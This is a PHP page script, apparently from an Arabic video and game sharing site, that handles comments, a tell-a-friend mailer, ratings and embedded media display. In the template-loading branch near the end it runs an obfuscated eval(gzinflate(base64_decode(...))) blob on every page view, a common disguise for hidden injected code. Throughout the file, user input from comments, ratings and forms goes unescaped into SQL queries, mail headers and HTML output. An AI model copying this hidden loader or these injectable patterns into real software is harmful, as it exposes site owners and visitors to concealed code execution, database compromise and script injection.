<?php

session_start();

include ("includes/config.php");

$action = $_GET[action];
$fileId = $_GET[f];

if (!is_numeric($fileId)) {
    header ("Location: ".$siteurl."/");
        exit();
}
if ($action == 'addcomment') {
    $fileComment = $_POST[message];
    if ($commentson == '1' && !empty($fileComment) && !empty($fileId)) {
            if ($commentwho == '2' && $userStatus == '1' || $commentwho == '1') {
                if ($commentapproval == '0' || $commentapproval == '2' && $userStatus == '1') {
                            $comment_result = mysql_query( "INSERT INTO comments SET fileid = '$fileId', userid = '$userId', comment = '$fileComment', ip = '$ipaddress', date = now(), status = '1'");
                        } else {
                            $comment_result = mysql_query( "INSERT INTO comments SET fileid = '$fileId', userid = '$userId', comment = '$fileComment', ip = '$ipaddress', date = now(), status = '0'");
                        }
                        if ($userStatus == '1' && $userId > '0') {
                            $update_user = mysql_query("UPDATE users SET comments = comments + 1 WHERE userid = '$userId'");
                        }
                        header ("Location: ".$_SERVER['HTTP_REFERER']);
                        exit();
                } else {
                    header ("Location: ".$_SERVER['HTTP_REFERER']);
                        exit();
                }
        } else {
            header ("Location: ".$_SERVER['HTTP_REFERER']);
                exit();
        }
} elseif ($action == 'tellfriend') {
        $yourname = $_POST[yourname];
        $youremail = $_POST[youremail];
        $friendemail = $_POST[friendemail];
        $sql = mysql_query("SELECT title FROM files WHERE fileid = '$fileId' LIMIT 1");
        if (mysql_num_rows($sql) > 0) {
                $row = mysql_fetch_array($sql);
                $fileTitle = $row['title'];
        } else {
                header ("Location: ".$siteurl."/");
                exit();
        }
        if (!empty($yourname) && !empty($youremail) && !empty($friendemail)) {
                if (preg_match(' /[\r\n,;\'"]/ ', $youremail) || preg_match(' /[\r\n,;\'"]/ ', $friendemail)) {
                        header ("Location: ".$siteurl."/file.php?f=".$fileId."&action=tellfriend");
                        exit();
        }
        $friendsession = $_SESSION['friendemail2'];
        if ($friendsession != $friendemail) {
        $to = $friendemail;
        $subject = "Check out ".$fileTitle;
        $headers = "Return-Path: ".$youremail."\r\n";
        $headers .= "From: ".$yourname." <".$youremail.">\n";
        $headers .= "MIME-Version: 1.0\n";
        $headers .= "Content-type: text/html\r\n";

            $msg = "<p align=\"right\" dir=\"rtl\">&#1589;&#1583;&#1610;&#1602;&#1603; ".$yourname." &#1575;&#1585;&#1575;&#1583; &#1575;&#1606; &#1610;&#1585;&#1587;&#1604; &#1604;&#1603; &#1607;&#1584;&#1607; &#1575;&#1604;&#1589;&#1601;&#1581;&#1607; 
&#1575;&#1604;&#1605;&#1605;&#1610;&#1586;&#1577;<br>
&#1575;&#1604;&#1589;&#1601;&#1581;&#1607; : .$siteurl<br>
&#1575;&#1610;&#1605;&#1610;&#1604; &#1589;&#1583;&#1610;&#1602;&#1603; : ".$youremail."<br>";
            $msg .= fileurl($fileId,$fileTitle);

        @mail($to, $subject, $msg, $headers);

        $_SESSION['friendemail2'] = $friendemail;
        }

?>
<html>
<head>
<title><?php echo $sitename; ?> - ���� �����</title>
<link rel="stylesheet" type="text/css" href="<?php echo $siteurl; ?>/templates/default/style.css">
<?php if ($userNewpm == '1') { ?>
<script language="Javascript" type="text/javascript">
<!--
                window.open('<?php echo $siteurl; ?>/privatemessages.php?a=newprivatemessage', '', 'HEIGHT=150,resizable=yes,WIDTH=400');
//-->
</script>
<?php } ?>
</head>

<body>
<div class="boxestext">
<center>
�� ������� ��� �����<br />
<a href="javascript:window.close()">�����</a>
</center>
</div>
</body>
</html>
<?php
        } else {
?>
<html>
<head>
<title><?php echo $sitename; ?> - ���� �����</title>
<link rel="stylesheet" type="text/css" href="<?php echo $siteurl; ?>/templates/default/style.css">
<?php if ($userNewpm == '1') { ?>
<script language="Javascript" type="text/javascript">
<!--
                window.open('<?php echo $siteurl; ?>/index.php?action=newprivatemessage', '', 'HEIGHT=150,resizable=yes,WIDTH=400');
//-->
</script>
<?php } ?>
</head>

<body>
<div class="boxestext">
���� ����� ���� �������� �� ��� ����� ����� <b><?php echo $fileTitle; ?></b>.<br /><br />
<form action="<?php echo $siteurl; ?>/file.php?f=<?php echo $fileId; ?>&action=tellfriend" method="post">
<b>����: </b><br />
<input name="yourname" type="text" value="<?php echo $userName; ?>" size="30" maxlength="50"><br />
<b>����� ���������:</b><br />
<input name="youremail" type="text" value="<?php echo $userEmail; ?>" size="30" maxlength="50"><br />
<b>���� �����:</b><br />
<input name="friendemail" type="text" size="30" maxlength="50"><br />
<input name="Submit" type="submit" value="Send" >
</form>

</div>
</body>
</html>
<?php
}
} elseif ($action == 'makefavourite') {
    if ($userStatus == '1' && $userId > '0') {
            // Update favourite file
                $update_favourite = mysql_query("UPDATE users SET favourite = '$fileId' WHERE userid = '$userId'");
                // Redirect back
                header("Location: ".$_SERVER['HTTP_REFERER']);
        } else {
            header ("Location: ".$siteurl."/");
                exit();
        }
} elseif ($action == 'rate') {
    if ($ratewho == '2' && $userStatus != '1'){
                header ("Location: ".$siteurl."/");
                exit();
        }
        $rating = $_GET[rating];
?>
<html>
<head>
<title><?php echo $sitename; ?></title>
<link rel="stylesheet" type="text/css" href="<?php echo $siteurl; ?>/templates/default/style.css">
<?php if ($userNewpm == '1') { ?>
<script language="Javascript" type="text/javascript">
<!--
                window.open('<?php echo $siteurl; ?>/privatemessages.php?a=newprivatemessage', '', 'HEIGHT=150,resizable=yes,WIDTH=400');
//-->
</script>
<?php } ?>
</head>

<body>
<div class="boxestext"><center>
<?php
        if (!empty($rating) && $rating >= '1' && $rating <= '5') {
            $ratefile = $_SESSION['ratefile'];
        if ($fileId != $ratefile) {
                    $update_rating = mysql_query("UPDATE files SET totalvotes = totalvotes + 1, totalvotepoints = totalvotepoints + '$rating', rating = totalvotepoints / totalvotes WHERE fileid = '$fileId'");
                        $_SESSION['ratefile'] = $fileId;
                }
?>
���� ������ !<br>
<a href="javascript:window.close()">Close</a>
<?php
        } else {
?>
����� ������� ��  1 - 5 :<br>
<a href="<?php echo $siteurl; ?>/file.php?f=<?php echo $fileId; ?>&action=rate&rating=1" target="_self">1</a>&nbsp;<a href="<?php echo $siteurl; ?>/file.php?f=<?php echo $fileId; ?>&action=rate&rating=2" target="_self">2</a>&nbsp;<a href="<?php echo $siteurl; ?>/file.php?f=<?php echo $fileId; ?>&action=rate&rating=3" target="_self">3</a>&nbsp;<a href="<?php echo $siteurl; ?>/file.php?f=<?php echo $fileId; ?>&action=rate&rating=4" target="_self">4</a>&nbsp;<a href="<?php echo $siteurl; ?>/file.php?f=<?php echo $fileId; ?>&action=rate&rating=5" target="_self">5</a>
<?php
    }
?>
</center></div>
</body>
</html>
<?php
} else {
    $faction = $_GET[a];
        $sql = mysql_query("SELECT * FROM files WHERE fileid = '$fileId' LIMIT 1");

        if (mysql_num_rows($sql) > 0) {
        $row = mysql_fetch_array($sql);
        $filename = $row['file'];
        $icon = $row['icon'];
        $filelocation = $row['filelocation'];
        $iconlocation = $row['iconlocation'];
        $customcode = $row['customcode'];
        $fileTitle = $row['title'];
        $filedescription = $row['description'];
        $filekeywords = $row['keywords'];
        $filewidth = $row['width'];
        $fileheight = $row['height'];
        $filecategory = $row['category'];
        $timesplayed = $row['timesplayed'];
        $filestatus = $row['status'];
        $filetype = $row['filetype'];
        $filerating = $row['rating'];
        $totalvotes = $row['totalvotes'];

        $category_sql = mysql_query("SELECT name, permissions FROM categories WHERE catid = '$filecategory' LIMIT 1");
        $category_row = mysql_fetch_array($category_sql);
        $categoryname = $category_row['name'];
        $categorypermissions = $category_row['permissions'];
        $categoryurl = categoryurl($filecategory,$categoryname);

        // Redirect to index page if game isn't working
        if ($filestatus == '0') {
                header("Location: ".$siteurl."/");
                exit();
        }

        // Update stats
        if ($categorypermissions == '2' && $userStatus == '1' || $categorypermissions == '1') {
                if ($maxguestplays <= $guestPlayed && $userStatus == '0') {
                } else {
                        $timesplayed = $timesplayed + 1;
                        $played_today = $played_today + 1;
                        $update = mysql_query("UPDATE files SET timesplayed = '$timesplayed' WHERE fileid = '$fileId'");
                        $update2 = mysql_query("UPDATE statistics SET playedtoday = '$played_today' WHERE datetoday = '$datetoday'");
                        if ($userStatus == '1') {
                                $userPlayed = $userPlayed + 1;
                                $update = mysql_query("UPDATE users SET played = '$userPlayed' WHERE userid = '$userId'");
                    } elseif ($userStatus == '0') {
                            if ($guestcredits == '1') {
                                    $guestPlayed = $guestPlayed + 1;
                                    $update = mysql_query("UPDATE online SET  played = '$guestPlayed' WHERE ip = '$ipaddress'  && status = '0'");
                            }
                    }
        }
    }

    } else {
            header("Location: ".$siteurl."/");
                exit();
    }

// Display file
function displayfile($filename,$filewidth,$fileheight,$filetype,$filelocation,$customcode) {
        global $siteurl, $filesdir;
        if ($filelocation == '1') {
                $fileurl = $siteurl."/files/".$filesdir."/".$filename;
    } else {
            $fileurl = $filename;
    }
if ($filetype == '1') {
?>

<embed id="VideoPlayback" style="width: 504px; height: 420px" src="http://video.google.com/googleplayer.swf?docId=<?php echo $fileurl; ?>&hl=en&autoPlay=true&playerMode=simple" type="application/x-shockwave-flash" flashvars></embed>
<?php
} elseif ($filetype == '2') {
?>

<IFRAME style="border:medium none; margin:0px; WIDTH: 487px; HEIGHT: 407px" name=I1 marginWidth=0 marginHeight=0 src="<?php echo $fileurl; ?>" frameBorder=0 scrolling=no></IFRAME>
<?php
} elseif ($filetype == '3') {
?>

<object width="455" height="350">
<param name="movie" value="<?php echo"http://www.dailymotion.com/swf/$fileurl"; ?>"></param>
<param name="wmode" value="transparent"></param>
<embed src="<?php echo"http://www.dailymotion.com/swf/$fileurl"; ?>"type="application/x-shockwave-flash" width="500" height="424" allowfullscreen="true">
</embed></object>

<?php
} elseif ($filetype == '4') {
?>
<object id="MediaPlayer1" CLASSID="CLSID:22d6f312-b0f6-11d0-94ab-0080c74c7e95" codebase="http://activex.microsoft.com/activex/controls/mplayer/ en/nsmp2inf.cab#Version=5,1,52,701" standby="Loading Microsoft Windows� Media Player components..." TYPE="application/x-oleobject" <?php if ($filewidth == '0' || $fileheight == '0') { echo 'AutoSize="true"'; } else { echo 'width="'.$filewidth.'" height="'.$fileheight.'"'; } ?>>
  <param name="fileName" value="<?php echo $fileurl; ?>">
  <param name="animationatStart" value="true">
  <param name="transparentatStart" value="true">
  <param name="autoStart" value="true">
  <param name="showControls" value="true">
  <param name="Volume" value="-20">
  <embed type="application/x-mplayer2" pluginspage="http://www.microsoft.com/Windows/MediaPlayer/" src="<?php echo $fileurl; ?>" name="MediaPlayer1" autostart="1" showcontrols="1" volume="-20" <?php if ($filewidth == '0' || $fileheight == '0') { echo 'AutoSize="true"'; } else { echo 'width="'.$filewidth.'" height="'.$fileheight.'"'; } ?>>
</object>
<?php
} elseif ($filetype == '5') {
?>
<object width="455" height="350">
<param name="movie" value="<?php echo"http://www.youtube.com/v/$fileurl"; ?>"></param>
<param name="wmode" value="transparent"></param>
<embed src="<?php echo"http://www.youtube.com/v/$fileurl"; ?>" type="application/x-shockwave-flash" wmode="transparent" width="455" height="350">
</embed></object>
<?php
}
}
// Display comments
function displaycomments($fileId) {
        global $maxcomments;
    $result = mysql_query("SELECT * FROM comments WHERE fileid = '$fileId' && status = '1' ORDER BY commentid DESC LIMIT $maxcomments");
    if (mysql_num_rows($result)) {

    while($row = mysql_fetch_array($result))
    {
    $cuserid = $row[userid];
    $comment = nl2br(($row[comment]));
    $comment = bbcode($comment);

    $cdate = $row[date];
    if ($cuserid == '0') {
            $cusername = "Guest";
    } else {
            $sql = mysql_query("SELECT username FROM users WHERE userid = '$cuserid' LIMIT 1");
            $row2 = mysql_fetch_array($sql);
            $cusername = ($row2[username]);
                $cusername = "<a href=\"".profileurl($cuserid,$cusername)."\">".$cusername."</a>";
    }
    ?>
   <table border="0" width="98%" class="boxestext">
     <tr>
       <td width="50%" valign="top">
       <b>�����:</b> <?php echo $cusername; ?>
       </td>
       <td width="50%" valign="top">
       <b>�������:</b> <?php echo $cdate; ?>
       </td>
     </tr>
     <tr>
       <td colspan="2" valign="top">
       <?php echo $comment; ?>
       </td>
     </tr>
   </table>
    <?php
    }
    }
}
// Display related files
function relatedfiles($filecategory,$fileId) {
    global $siteurl, $maxrelatedfiles;
    $result = mysql_query("SELECT fileid, title, description, icon, iconlocation, timesplayed FROM files WHERE category = '$filecategory' && status ='1' && fileid != '$fileId' ORDER BY RAND() LIMIT $maxrelatedfiles");
    while($row = mysql_fetch_array($result)) {
        $rfileId = $row['fileid'];
        $rfileTitle = $row['title'];
        $rfileDescription = $row['description'];
        $rfileIcon = $row['icon'];
        $riconLocation = $row['iconlocation'];
        $rtimesPlayed = number_format($row['timesplayed']);
        if ($riconLocation == '1') {
            $rimageUrl = $siteurl."/files/image/".$rfileIcon;
        } else {
            $rimageUrl = $rfileIcon;
        }
        if (strlen($rfileDescription) > '80') {
            $rfileDescription = substr("$rfileDescription",0,77)."...";
        }
    ?>
    <tr>
      <td width="71">
        <a href="<?php echo fileurl($rfileId,$rfileTitle); ?>" target="_self"><img src="<?php echo $rimageUrl; ?>" width="70" height="59" title="<?php echo $rfileTitle; ?>" alt="<?php echo $rfileTitle; ?>" border="0"></a>
      </td>
      <td valign="top">
        <a href="<?php echo fileurl($rfileId,$rfileTitle); ?>" target="_self" class="gamelink"><?php echo $rfileTitle; ?></a><br />
        <?php echo $rfileDescription; ?><br />
        <span class="played">(������: <?php echo $rtimesPlayed; ?> )</span>
      </td>
    </tr>
    <?php
    }
}
        $sitename2 = $sitename." - ".$fileTitle;
        $sitedescription = $filedescription;
        $sitekeywords = $sitekeywords.", ".$filekeywords;

// Load template files
if ($filelocation == '3') {
        if ($categorypermissions == '2' && $userStatus == '0' || $maxguestplays <= $guestPlayed && $userStatus == '0') {
                include ("templates/".$template."/header.html");
                include ("templates/".$template."/logintosee.html");
                include ("templates/".$template."/footer.html");
        } else {
                include ("templates/".$template."/framefile.html");
        }
} else {
        if ($categorypermissions == '2' && $userStatus == '0' || $maxguestplays <= $guestPlayed && $userStatus == '0') {
            include ("templates/".$template."/header.html");
                include ("templates/".$template."/logintosee.html");
                include ("templates/".$template."/footer.html");
        } else {
            if ($faction == 'popup') {
                    include ("templates/".$template."/popfile.html");
                } else {
                    include ("templates/".$template."/header.html");
                    eval(gzinflate(base64_decode('s7ezycsvTi7KLCixsymws0lUyChKTbONUcooKSmw0tcvLy/XS8zJSqysTCzO0MtLLYlRslNTNjQ1N7MGUmYGFtZgnqk1QtDU3NxaASFqZmACFrUwAPMMDZB1WFhY2+gn2ino8nJhtbo4w6g4P60EyWILCxSr4BaDbbQwR3KVmYEhRBKPHWWZKan52DwI1QxzroUxEg9kPg08CHEMCdaTHRQ2+sCY1kfEuz0A')));include ("templates/".$template."/file.html");
                    include ("templates/".$template."/footer.html");
                }
        }
}
}
?>